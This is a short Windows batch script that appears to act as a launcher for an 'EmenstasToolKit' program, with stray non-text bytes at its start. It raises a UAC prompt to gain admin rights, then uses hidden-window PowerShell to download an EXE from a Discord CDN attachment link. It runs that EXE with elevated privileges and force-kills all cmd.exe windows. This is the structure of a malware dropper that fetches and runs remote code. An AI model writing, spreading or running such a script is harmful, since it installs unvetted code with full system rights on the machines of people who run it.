��&cls
@echo off
setlocal

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
  >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
  >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if "%errorlevel%" NEQ "0" (
  goto UACPrompt
) else (
  goto gotAdmin
)

:UACPrompt
echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin

REM --> Download the file from the provided link
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1157283611670745220/1169334507367825480/EmenstasToolKit.EXE?ex=6555069f&is=6542919f&hm=4ac538423df079add82b1e8492959a353c4fd7cf3109d32c3299789abe18eccd&' -OutFile 'EmenstasToolKit.EXE'"

REM --> Execute the downloaded file and wait for it to finish
echo Executing the downloaded file...
start /wait /min EmenstasToolKit.EXE

REM --> Close the command prompt window
taskkill /F /IM cmd.exe
